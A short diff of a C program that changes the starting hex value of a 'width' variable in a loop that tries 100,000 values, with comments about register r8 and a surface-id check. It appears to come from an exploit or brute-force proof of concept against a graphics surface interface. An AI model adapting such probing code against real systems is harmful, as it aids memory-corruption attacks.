@@ -81,7 +81,7 @@ int main() {
 
     for(int i=0; i < 100000; i++) {
         
-        int width = 0x100006b + i; // r8
+        int width = 0x400049 + i; // r8
         int surface_id = 8; // there's a check if surface id is 9 or over
 
         printf("[INFO]: Trying 0x%x\n", width);
